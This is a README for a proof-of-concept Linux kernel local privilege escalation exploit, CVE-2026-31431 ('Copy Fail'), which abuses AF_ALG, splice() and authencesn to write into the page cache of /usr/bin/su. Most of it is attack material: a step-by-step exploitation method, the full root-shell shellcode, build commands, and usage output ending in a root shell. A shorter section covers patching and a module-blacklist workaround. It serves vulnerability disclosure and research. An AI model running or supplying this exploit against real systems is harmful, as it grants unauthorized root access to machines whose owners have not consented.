# Copy Fail - CVE-2026-31431 PoC

Local privilege escalation exploit for **CVE-2026-31431** (Copy Fail), a logic bug in the Linux kernel's `authencesn` cryptographic template that allows an unprivileged local user to perform a controlled 4-byte write into the page cache of any readable file.

## Vulnerability

The bug exists at the intersection of three kernel subsystems:

1. **AF_ALG** — exposes kernel crypto to unprivileged userspace via sockets
2. **splice()** — delivers page cache pages by reference into the crypto scatterlist
3. **authencesn** — uses the destination scatterlist as scratch space for ESN byte rearrangement, writing 4 bytes past the AEAD tag boundary

When AEAD decryption is performed in-place (the vulnerable code path), `authencesn`'s scratch write at `dst[assoclen + cryptlen]` crosses from the output buffer into chained page cache tag pages, directly corrupting the kernel's cached copy of the target file. The corrupted page is never marked dirty, so on-disk integrity checks are bypassed.

## How It Works

1. **ELF parsing** — resolves `/usr/bin/su`'s entry point virtual address to a file offset via `PT_LOAD` program headers
2. **AF_ALG setup** — binds to `authencesn(hmac(sha256),cbc(aes))` with a zero key
3. **4-byte page cache writes** — for each chunk of the shellcode payload:
   - `sendmsg()` sends AAD with the shellcode bytes as `seqno_lo` (bytes 4-7), with `MSG_MORE`
   - `splice()` delivers 32 bytes of the target file's page cache pages as the AEAD authentication tag
   - `recv()` triggers decryption — `authencesn`'s scratch write lands in the chained page cache pages, writing 4 controlled bytes. The HMAC verification fails (EBADMSG) but the write persists
4. **Privilege escalation** — `execl("/usr/bin/su")` loads the corrupted page cache. The 40-byte shellcode (`setuid(0)` + `execve("/bin/sh")`) runs as setuid-root

## Shellcode

```asm
xor    edi, edi            ; uid = 0
mov    eax, 105            ; sys_setuid
syscall
xor    edx, edx            ; envp = NULL
push   rdx                 ; null terminator
movabs rax, "/bin/sh"      ; "/bin/sh\0"
push   rax
mov    rdi, rsp            ; filename
push   rdx                 ; NULL (argv[1])
push   rdi                 ; argv[0]
mov    rsi, rsp            ; argv
mov    eax, 59             ; sys_execve
syscall
```

## Build

Requires `musl-gcc` or any C compiler with static linking support:

```bash
musl-gcc -static -O2 -s -o copyfail exploit.c
```

Alternatively with GCC + glibc:

```bash
gcc -static -O2 -s -o copyfail exploit.c
```

## Usage

```bash
$ ./copyfail
[*] CVE-2026-31431 PoC (Copy Fail)
[*] /usr/bin/su entry @ file offset 0x78
[*] Patching page cache (40 bytes, 10 writes)
..........
[+] Executing /usr/bin/su
# id
uid=0(root) gid=1000(user) groups=1000(user)
```

## Affected Systems

All Linux distributions shipping kernels from **4.10** (2017) through kernels before the fix commit [`a664bf3d`](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5). Tested on:

| Distribution | Kernel |
|---|---|
| Ubuntu 24.04 LTS | 6.17.0 |
| Amazon Linux 2023 | 6.18.8 |
| RHEL 10.1 | 6.12.0 |
| SUSE 16 | 6.12.0 |
| Debian (unpatched) | 6.x |

## Mitigation

Patch the kernel. The [fix](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5) reverts `algif_aead.c` to out-of-place operation, preventing page cache pages from entering the writable scatterlist.

Immediate workaround — blacklist the vulnerable module:

```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif_aead.conf
rmmod algif_aead 2>/dev/null
```

## References

- [Copy Fail: 732 Bytes to Root on Every Major Linux Distribution](https://xint.io/blog/copy-fail-linux-distributions)
- [Fix commit a664bf3d](https://github.com/torvalds/linux/commit/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Introduced by commit 72548b093ee3](https://github.com/torvalds/linux/commit/72548b093ee3) (2017)

## Disclaimer

This proof-of-concept is provided for authorized security research and educational purposes only. Unauthorized use against systems you do not own or have explicit permission to test is illegal.
